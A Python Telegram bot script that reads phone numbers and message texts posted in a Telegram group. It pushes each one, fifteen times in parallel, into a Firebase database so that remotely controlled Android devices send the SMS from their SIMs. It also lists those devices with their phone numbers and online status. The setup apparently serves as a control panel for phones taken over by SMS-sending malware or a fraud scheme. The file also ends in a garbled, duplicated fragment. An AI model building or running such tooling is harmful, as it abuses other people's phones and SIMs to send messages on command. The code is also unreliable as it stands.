"""
SIMPLE POWERFUL BOT v17 – GOD SPEED ZERO DELAY EDITION (MAXIMUM POSSIBLE FIREPOWER)
pip install aiogram==3.7.0 aiohttp telethon uvloop orjson
python bot.py
"""
import asyncio, json, os, time, logging, ssl, re
import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# ==================== ULTRA SPEED JSON (ORJSON IF AVAILABLE) ====================
try:
    import orjson as _json
    _USE_ORJSON = True
except ImportError:
    import json as _json
    _USE_ORJSON = False

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("PowerfulBot")

# ==================== ULTRA SPEED REGEX (PRE-COMPILED) ====================
ONE_TAP_RE = re.compile(r'(?i)One-tap copy:\s*([0-9+][0-9+\s-]*)\s*\|\s*(.+?)(?:\n|$)', re.IGNORECASE)

# Secrets/configuration are supplied through environment variables.
BOT_TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
DATA_FILE = os.environ.get("DATA_FILE", "bot_data.json")
API_ID = int(os.environ["API_ID"])
API_HASH = os.environ["API_HASH"]

# ---------- CONNECTION POOL (ULTRA MAX) ----------
_conn_pool = []  # list of (reader, writer)
_pool_lock = asyncio.Lock()
_pool_host = None

# ---------- IN‑MEMORY DATA ----------
_DATA = None
_save_pending = False
_save_lock = asyncio.Lock()
device_cache = {}

def _default_data():
    return {
        "firebase_url": None,
        "active_device": None,
        "monitoring": False,
        "group_id": None,
        "active_sim": 0,
        "telethon_session": None,
        "user_bot_active": False,
        "recent_detections": []
    }

def load_data():
    global _DATA
    if _DATA is None:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE) as f:
                _DATA = json.load(f)
        else:
            _DATA = _default_data()
        for k, v in _default_data().items():
            if k not in _DATA:
                _DATA[k] = v
    return _DATA

def save_data():
    global _save_pending
    if not _save_pending:
        _save_pending = True
        asyncio.create_task(_debounced_write())

async def _debounced_write():
    global _save_pending
    await asyncio.sleep(0.5)
    async with _save_lock:
        with open(DATA_FILE, "w") as f:
            json.dump(_DATA, f, indent=2)
        _save_pending = False

def get_sim_slot(sim: dict, fallback: int) -> int:
    for key in ("simSlotIndex", "slot", "simSlot", "index"):
        val = sim.get(key)
        if val is not None:
            try:
                return int(val)
            except (ValueError, TypeError):
                pass
    return fallback

def get_sim_phone(sim: dict) -> str:
    for key in ("phoneNumber", "number", "phone", "msisdn", "simNumber"):
        val = sim.get(key)
        if val:
            return str(val)
    return ""

def get_device_name(dd: dict, did: str) -> str:
    return (dd.get("deviceName") or dd.get("name") or dd.get("model") or
            dd.get("modelName") or dd.get("deviceModel") or dd.get("brand") or
            dd.get("manufacturer") or did)

http_session = None

async def get_session():
    global http_session
    if http_session is None or http_session.closed:
        conn = aiohttp.TCPConnector(limit=0)
        http_session = aiohttp.ClientSession(connector=conn)
    return http_session

class Setup(StatesGroup):
    firebase = State()
    device = State()
    group = State()
    phone = State()
    otp = State()
    password = State()

R = Router()
telethon_client = None
user_handler_ref = None

# ==================== ULTRA‑FAST PARSER (REGEX POWER) ====================
def parse_one_tap(text: str):
    if not text or '|' not in text:   # ultra fast path - 99% messages skipped in <1us
        return None, None
    match = ONE_TAP_RE.search(text)
    if match:
        number = match.group(1).strip()
        message = match.group(2).strip()
        return (number, message) if number and message else (None, None)
    return None, None

# ==================== CONNECTION POOL + PARALLEL SEND (ULTRA MAX SPEED) ====================
async def warmup_firebase():
    global _conn_pool, _pool_host
    data = load_data()
    fb = data.get("firebase_url")
    if not fb:
        return False
    host = fb.replace("https://", "").replace("http://", "").rstrip('/')
    _pool_host = host
    for _, writer in _conn_pool:
        try:
            writer.close()
        except:
            pass
    _conn_pool.clear()
    ssl_ctx = ssl.create_default_context()
    tasks = [asyncio.open_connection(host, 443, ssl=ssl_ctx) for _ in range(30)]  # ← 30 connections GOD SPEED MODE
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for res in results:
        if not isinstance(res, Exception) and res is not None:
            reader, writer = res
            _conn_pool.append((reader, writer))
    log.info(f"🔥 {len(_conn_pool)} connections pre‑warmed (GOD SPEED ZERO DELAY MODE)")
    return len(_conn_pool) > 0

async def get_connection():
    global _conn_pool, _pool_host
    async with _pool_lock:
        while _conn_pool:
            reader, writer = _conn_pool.pop()
            if not writer.is_closing():
                return reader, writer
    ssl_ctx = ssl.create_default_context()
    reader, writer = await asyncio.open_connection(_pool_host, 443, ssl=ssl_ctx)
    return reader, writer

async def return_connection(reader, writer):
    global _conn_pool
    if writer.is_closing():
        try:
            writer.close()
        except:
            pass
        return
    async with _pool_lock:
        _conn_pool.append((reader, writer))

async def fire_one(to, sms, dev, sim_slot, host):
    url_path = f"/clients/{dev}/webhookEvent/sendSms.json?print=silent"
    data_dict = {
        "from": sim_slot,
        "to": to,
        "message": sms,
        "isSended": False,
        "timestamp": int(time.time())
    }
    if _USE_ORJSON:
        payload = _json.dumps(data_dict)  # orjson returns bytes directly - GOD SPEED
    else:
        payload = _json.dumps(data_dict).encode('utf-8')
    http_request = (
        f"PUT {url_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(payload)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode() + payload
    try:
        reader, writer = await get_connection()
        writer.write(http_request)
        await asyncio.wait_for(writer.drain(), timeout=0.1)  # even tighter for max speed
        await return_connection(reader, writer)
    except:
        pass

async def fire_sms_parallel(to, sms):
    data = load_data()
    fb = data.get("firebase_url")
    dev = data.get("active_device")
    if not fb or not dev:
        return
    host = fb.replace("https://", "").replace("http://", "").rstrip('/')
    sim_slot = data.get("active_sim", 0)
    tasks = [fire_one(to, sms, dev, sim_slot, host) for _ in range(15)]  # ← 15 parallel GOD SPEED FIRE (maximum redundancy + speed)
    await asyncio.gather(*tasks, return_exceptions=True)
    recent = data.setdefault("recent_detections", [])
    recent.insert(0, (to, sms))
    if len(recent) > 5:
        recent.pop()
    save_data()

# ---------- START ----------
@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    data = load_data()
    if not data.get("firebase_url"):
        await state.set_state(Setup.firebase)
        await msg.answer(
            "👋 **Welcome!**\n\n"
            "Pehle apna **Firebase URL** bhejo:\n\n"
            "Example: `https://your-project.firebaseio.com`",
            parse_mode="Markdown"
        )
    else:
        await msg.answer(
            "✅ **Bot Ready! (ULTRA SPEED MODE)**\n\n"
            "Use /login to connect your Telegram account for group monitoring.",
            reply_markup=main_menu(),
            parse_mode="Markdown"
        )

def main_menu():
    kb = [
        [InlineKeyboardButton(text="📱 Load Devices", callback_data="load_devices")],
        [InlineKeyboardButton(text="🔍 Search Device", callback_data="search")],
        [InlineKeyboardButton(text="⚙️ Change Device", callback_data="change_device")],
        [InlineKeyboardButton(text="▶️ Start Monitor", callback_data="start_monitor"),
         InlineKeyboardButton(text="⏹ Stop", callback_data="stop_monitor")],
        [InlineKeyboardButton(text="📌 Set Group ID", callback_data="set_group")],
    ]
    data = load_data()
    if data.get("active_device"):
        kb.append([InlineKeyboardButton(text="📶 Change SIM", callback_data="change_sim")])
    kb += [
        [InlineKeyboardButton(text="📊 Status", callback_data="status")],
        [InlineKeyboardButton(text="📋 Last 5 Detections", callback_data="recent")],
        [InlineKeyboardButton(text="🔄 Change Firebase", callback_data="change_firebase")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

# ---------- FIREBASE ----------
@R.callback_query(F.data == "change_firebase")
async def change_firebase(cq: CallbackQuery, state: FSMContext):
    await state.set_state(Setup.firebase)
    await cq.message.edit_text("🔄 **Firebase URL Change**\n\nApna naya Firebase URL bhejo:", parse_mode="Markdown")
    await cq.answer()

@R.message(Setup.firebase)
async def save_firebase(msg: Message, state: FSMContext):
    url = msg.text.strip()
    if not url.startswith("http"):
        await msg.answer("❌ URL galat hai. https:// se shuru karo.")
        return
    data = load_data()
    data["firebase_url"] = url
    save_data()
    await state.clear()
    global _conn_pool
    _conn_pool.clear()
    await msg.answer("✅ **Firebase URL Save Ho Gaya!**\n\nAb Device select karo.", reply_markup=main_menu())

# ---------- DEVICE ----------
def dev_online(dd: dict) -> bool:
    if not isinstance(dd, dict):
        return False
    if dd.get("isOnline") or dd.get("online") or dd.get("connected"):
        return True
    if dd.get("status") in ("online", "active", True, 1):
        return True
    if dd.get("active") or dd.get("state") == "online":
        return True
    if dd.get("deviceName") and not dd.get("offline"):
        return True
    return False

async def fetch_devices(fb_url):
    try:
        sess = await get_session()
        url = f"{fb_url.rstrip('/')}/clients.json"
        async with sess.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
            if r.status != 200:
                return None
            devices = await r.json()
            if not devices or devices == "null":
                return {}
            return devices
    except Exception as e:
        log.error(f"fetch_devices error: {e}")
        return None

def devices_page_kb(devices: dict, page: int = 0):
    items = list(devices.items())
    per_page = 5
    total_pages = (len(items) + per_page - 1) // per_page
    start = page * per_page
    chunk = items[start:start+per_page]
    rows = []
    for did, dd in chunk:
        name = get_device_name(dd, did)
        sims = dd.get("sims", [])
        phone = get_sim_phone(sims[0]) if sims else ""
        online = "🟢" if dev_online(dd) else "🔴"
        label = f"{online} {name}"
        if phone:
            label += f" | 📞 {phone}"
        label = label[:50]
        rows.append([InlineKeyboardButton(text=label, callback_data=f"pick:{did}")])
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton(text="◀️ Prev", callback_data=f"devpg:{page-1}"))
    if page < total_pages - 1:
        nav_row.append(InlineKeyboardButton(text="Next ▶️", callback_data=f"devpg:{page+1}"))
    if nav_row:
        rows.append(nav_row)
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="back")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data == "load_devices")
async def load_devices(cq: CallbackQuery):
    global device_cache
    data = load_data()
    fb_url = data.get("firebase_url")
    if not fb_url:
        await cq.answer("❌ Firebase URL not set.", show_alert=True)
        return
    await cq.answer("⏳ Fetching devices...")
    msg = await cq.message.edit_text("⏳ Fetching devices from Firebase...")
    devices = await fetch_devices(fb_url)
    if devices is None:
        await msg.edit_text("❌ Firebase connection error. Check your URL.")
        return
    if not devices:
        await msg.edit_text("😴 Firebase mein koi device nahi mila.")
        return
    device_cache = devices
    await msg.edit_text("✅ Devices loaded! Select one:", reply_markup=devices_page_kb(device_cache, page=0))

@R.callback_query(F.data.startswith("devpg:"))
async def devices_page(cq: CallbackQuery):
    global device_cache
    page = int(cq.data.split(":")[1])
    if not device_cache:
        await cq.answer("⚠️ Pehle devices load karo.", show_alert=True)
        return
    await cq.message.edit_text("Select device:", reply_markup=devices_page_kb(device_cache, page=page))
    await cq.answer()

@R.callback_query(F.data == "search")
async def search_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(Setup.device)
    await cq.message.edit_text(
        "🔍 **Device Search**\n\n"
        "Device name, model, phone ya ID type karo.\n"
        "Just 'all' bhejo to see all devices.",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Cancel", callback_data="back")]
        ])
    )
    await cq.answer()

@R.message(Setup.device)
async def search_device(msg: Message, state: FSMContext):
    global device_cache
    await state.clear()
    query = msg.text.strip().lower()
    data = load_data()
    fb_url = data.get("firebase_url")
    if not fb_url:
        await msg.answer("❌ Pehle Firebase URL set karo.")
        return
    if not device_cache:
        await msg.answer("⏳ Loading devices first...")
        devices = await fetch_devices(fb_url)
        if devices is None:
            await msg.answer("❌ Firebase connection error. Check URL.")
            return
        if not devices:
            await msg.answer("😴 Firebase mein koi device nahi mila.")
            return
        device_cache = devices
    else:
        devices = device_cache
    if query == "" or query == "all":
        matched = devices
    else:
        matched = {}
        for did, dd in devices.items():
            name = get_device_name(dd, did).lower()
            sims = dd.get("sims", [])
            phone = get_sim_phone(sims[0]).lower() if sims else ""
            extra = (dd.get("model","") + " " + dd.get("modelName","") + " " + dd.get("deviceModel","")).lower()
            search_str = f"{name} {phone} {did.lower()} {extra}"
            if query in search_str:
                matched[did] = dd
    if not matched:
        await msg.answer("❌ Koi matching device nahi mila.")
        return
    rows = []
    for did, dd in list(matched.items())[:10]:
        name = get_device_name(dd, did)
        sims = dd.get("sims", [])
        phone = get_sim_phone(sims[0]) if sims else ""
        online = "🟢" if dev_online(dd) else "🔴"
        label = f"{online} {name}"
        if phone:
            label += f" | 📞 {phone}"
        label = label[:50]
        rows.append([InlineKeyboardButton(text=label, callback_data=f"pick:{did}")])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="back")])
    await msg.answer("✅ **Matching devices:**", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

# ---------- PICK DEVICE → SIM SELECTION ----------
@R.callback_query(F.data.startswith("pick:"))
async def pick_device(cq: CallbackQuery):
    did = cq.data.split("pick:")[1]
    data = load_data()
    data["active_device"] = did
    data["active_sim"] = 0
    save_data()
    await show_sim_selection(cq, did)

async def show_sim_selection(cq: CallbackQuery, did: str):
    global device_cache
    dd = device_cache.get(did) if device_cache else None
    if not dd:
        data = load_data()
        fb_url = data.get("firebase_url")
        if fb_url:
            devices = await fetch_devices(fb_url)
            if devices:
                device_cache = devices
                dd = devices.get(did)
    if not dd:
        await cq.message.edit_text("❌ Device details not found.", reply_markup=main_menu())
        await cq.answer()
        return
    sims = dd.get("sims", [])
    if not sims:
        await cq.message.edit_text(
            "✅ **Device Set!** (No SIMs found, default SIM 0 used.)",
            reply_markup=main_menu(),
            parse_mode="Markdown"
        )
        await cq.answer()
        return
    rows = []
    for idx, sim in enumerate(sims):
        slot = get_sim_slot(sim, idx)
        phone = get_sim_phone(sim) or "No number"
        carrier = sim.get("carrierName") or sim.get("simName") or ""
        label = f"📶 SIM {slot+1} | 📞 {phone}"
        if carrier:
            label += f" ({carrier})"
        rows.append([InlineKeyboardButton(text=label[:55], callback_data=f"sim:{did}:{slot}")])
    rows.append([InlineKeyboardButton(text="🔙 Skip (use SIM 0)", callback_data=f"sim:{did}:0")])
    await cq.message.edit_text(
        "**Select SIM for this device:**",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="Markdown"
    )
    await cq.answer()

@R.callback_query(F.data.startswith("sim:"))
async def pick_sim(cq: CallbackQuery):
    parts = cq.data.split(":")
    did = parts[1]
    slot = int(parts[2])
    data = load_data()
    data["active_sim"] = slot
    save_data()
    await cq.message.edit_text(
        f"✅ **Device & SIM set!**\nDevice: `{did}`\nActive SIM slot: {slot+1}\n\nAb Monitor start karo.",
        reply_markup=main_menu(),
        parse_mode="Markdown"
    )
    await cq.answer()

@R.callback_query(F.data == "change_sim")
async def change_sim(cq: CallbackQuery):
    data = load_data()
    did = data.get("active_device")
    if not did:
        await cq.answer("❌ Pehle device select karo!", show_alert=True)
        return
    await show_sim_selection(cq, did)

@R.callback_query(F.data == "change_device")
async def change_device(cq: CallbackQuery, state: FSMContext):
    await state.set_state(Setup.device)
    await cq.message.edit_text(
        "🔍 Naya device search karo:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Cancel", callback_data="back")]
        ])
    )
    await cq.answer()

# ---------- MONITOR ----------
@R.callback_query(F.data == "start_monitor")
async def start_monitor(cq: CallbackQuery):
    data = load_data()
    if not data.get("active_device"):
        await cq.answer("❌ Pehle device select karo!", show_alert=True)
        return
    if not data.get("group_id"):
        await cq.answer("❌ Pehle Group ID set karo!", show_alert=True)
        return
    data["monitoring"] = True
    save_data()
    await warmup_firebase()
    await cq.message.edit_text("🟢 **Monitor Started! (GOD SPEED ZERO DELAY MODE)**", reply_markup=main_menu())
    await cq.answer()

@R.callback_query(F.data == "stop_monitor")
async def stop_monitor(cq: CallbackQuery):
    data = load_data()
    data["monitoring"] = False
    save_data()
    await cq.message.edit_text("⏹ **Monitor Stopped**", reply_markup=main_menu())
    await cq.answer()

# ---------- GROUP ----------
@R.callback_query(F.data == "set_group")
async def set_group_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(Setup.group)
    await cq.message.edit_text(
        "📌 **Group ID Setup**\n\n"
        "Send the group chat ID (e.g., `-1001234567890`) or forward any message from that group.",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Cancel", callback_data="back")]
        ])
    )
    await cq.answer()

@R.message(Setup.group)
async def save_group(msg: Message, state: FSMContext):
    if msg.forward_from_chat:
        group_id = msg.forward_from_chat.id
    else:
        try:
            group_id = int(msg.text.strip())
        except ValueError:
            await msg.answer("❌ Invalid ID. Send numeric ID or forward a message.")
            return
    data = load_data()
    data["group_id"] = str(group_id)
    save_data()
    await state.clear()
    if telethon_client and data.get("telethon_session"):
        await start_user_monitor(msg.bot, telethon_client)
    await msg.answer(f"✅ **Group ID set to:** `{group_id}`\n\nAb Monitor start karo.",
                     reply_markup=main_menu(), parse_mode="Markdown")

# ---------- STATUS ----------
@R.callback_query(F.data == "status")
async def show_status(cq: CallbackQuery):
    data = load_data()
    mon = "🟢 Running" if data.get("monitoring") else "🔴 Stopped"
    dev = data.get("active_device", "Not Set")
    sim = data.get("active_sim", 0) + 1
    grp = data.get("group_id", "Not Set")
    user_active = "✅" if data.get("telethon_session") else "❌"
    await cq.message.edit_text(
        f"📊 **Status (ULTRA SPEED)**\n\nMonitor: {mon}\nDevice: `{dev}`\nSIM: {sim}\nGroup: `{grp}`\nUser Account: {user_active}",
        reply_markup=main_menu(),
        parse_mode="Markdown"
    )
    await cq.answer()

@R.callback_query(F.data == "recent")
async def show_recent(cq: CallbackQuery):
    data = load_data()
    recent = data.get("recent_detections", [])
    if not recent:
        await cq.answer("No detections yet.", show_alert=True)
        return
    text = "📋 **Last 5 Detections:**\n\n"
    for i, (to, msg) in enumerate(recent[-5:][::-1], 1):
        short = (msg[:40] + "…") if len(msg) > 40 else msg
        text += f"{i}. `{to}` → `{short}`\n"
    await cq.message.edit_text(text, reply_markup=main_menu(), parse_mode="Markdown")
    await cq.answer()

@R.callback_query(F.data == "back")
async def back(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    await cq.message.edit_text("✅ Main Menu", reply_markup=main_menu())
    await cq.answer()

# ---------- LOGIN ----------
@R.message(Command("login"))
async def login_start(msg: Message, state: FSMContext):
    await state.set_state(Setup.phone)
    await msg.answer("📱 **Telegram Login**\n\nApna phone number bhejo (with country code, e.g., +919876543210):")

@R.message(Setup.phone)
async def phone_handler(msg: Message, state: FSMContext):
    global telethon_client
    phone = msg.text.strip()
    await state.update_data(phone=phone)
    telethon_client = TelegramClient(StringSession(), API_ID, API_HASH)
    await telethon_client.connect()
    try:
        sent = await telethon_client.send_code_request(phone)
        await state.update_data(phone_code_hash=sent.phone_code_hash)
        await state.set_state(Setup.otp)
        await msg.answer("📩 OTP bhejo jo aapko mila hai:")
    except Exception as e:
        await msg.answer(f"❌ Error: {e}")
        await state.clear()
        await telethon_client.disconnect()

@R.message(Setup.otp)
async def otp_handler(msg: Message, state: FSMContext):
    global telethon_client
    otp = msg.text.strip()
    data = await state.get_data()
    phone = data['phone']
    phone_code_hash = data['phone_code_hash']
    try:
        await telethon_client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
    except SessionPasswordNeededError:
        await state.set_state(Setup.password)
        await msg.answer("🔒 2FA enabled. Apna password bhejo:")
        return
    except Exception as e:
        await msg.answer(f"❌ Login failed: {e}")
        await state.clear()
        await telethon_client.disconnect()
        return
    await finalize_login(msg)

@R.message(Setup.password)
async def password_handler(msg: Message, state: FSMContext):
    global telethon_client
    password = msg.text.strip()
    try:
        await telethon_client.sign_in(password=password)
    except Exception as e:
        await msg.answer(f"❌ Wrong password: {e}")
        await state.clear()
        await telethon_client.disconnect()
        return
    await finalize_login(msg)

async def finalize_login(msg: Message):
    global telethon_client
    session_str = telethon_client.session.save()
    d = load_data()
    d["telethon_session"] = session_str
    d["user_bot_active"] = True
    save_data()
    await start_user_monitor(msg.bot, telethon_client)
    await msg.answer("✅ **Logged in!** Your account is now monitoring the group. (GOD SPEED ZERO DELAY MODE)")

# ---------- USER MONITOR (INSTANT) ----------
async def start_user_monitor(bot: Bot, client: TelegramClient):
    global user_handler_ref
    data = load_data()
    group_id = data.get("group_id")
    if not group_id:
        log.warning("No group ID set.")
        return
    if user_handler_ref is not None:
        client.remove_event_handler(user_handler_ref)

    @client.on(events.NewMessage(chats=int(group_id)))
    async def handler(event):
        msg_text = event.raw_text or ""
        to, sms = parse_one_tap(msg_text)
        if to and sms:
            asyncio.create_task(fire_sms_parallel(to, sms))  # direct fire, no delay

    user_handler_ref = handler
    log.info(f"User monitor started for group {group_id}")
    await warmup_firebase()

# ---------- BOT GROUP HANDLER (INSTANT) ----------
@R.channel_post()
@R.message(F.chat.type.in_({"group", "supergroup"}))
async def bot_group_handler(msg: Message):
    data = load_data()
    target = data.get("group_id")
    if not target or str(msg.chat.id) != target:
        return
    if data.get("telethon_session") and data.get("user_bot_active"):
        return
    text = msg.text or msg.caption or ""
    to, sms = parse_one_tap(text)
    if to and sms:
        asyncio.create_task(fire_sms_parallel(to, sms))

@R.message(F.chat.type == "private", StateFilter(None))
async def private_test(msg: Message):
    text = msg.text or msg.caption or ""
    to, sms = parse_one_tap(text)
    if to and sms:
        asyncio.create_task(fire_sms_parallel(to, sms))
        await msg.answer(f"✅ **Detection Test Passed! (GOD SPEED)**\nTo: `{to}`\nMessage: `{sms}`")

# ==================== MAIN (UVLOOP POWERED) ====================
async def main():
    global telethon_client, user_handler_ref
    load_data()
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)

    data = load_data()
    if data.get("telethon_session"):
        try:
            telethon_client = TelegramClient(StringSession(data["telethon_session"]), API_ID, API_HASH)
            await telethon_client.start()
            await start_user_monitor(bot, telethon_client)
            log.info("User account auto‑logged in.")
        except Exception as e:
            log.error(f"Auto‑login failed: {e}")

    me = await bot.get_me()
    log.info(f"✅ @{me.username} started (GOD SPEED ZERO DELAY MODE)")
    try:
        await bot.send_message(OWNER_ID, f"🚀 Bot Online – GOD SPEED ZERO DELAY\n@{me.username}")
    except:
        pass

    await dp.start_polling(bot)

if __name__ == "__main__":
    # ==================== UVLOOP FOR MAXIMUM SPEED ====================
    try:
        import uvloop
        uvloop.install()
        log.info("🚀🚀🚀 UVLOOP ENABLED - ZERO DELAY MAX POWER MODE ACTIVE")
    except ImportError:
        log.info("uvloop not found. For absolute maximum speed run: pip install uvloop")
    
    asyncio.run(main())tall uvloop")
    
    asyncio.run(main())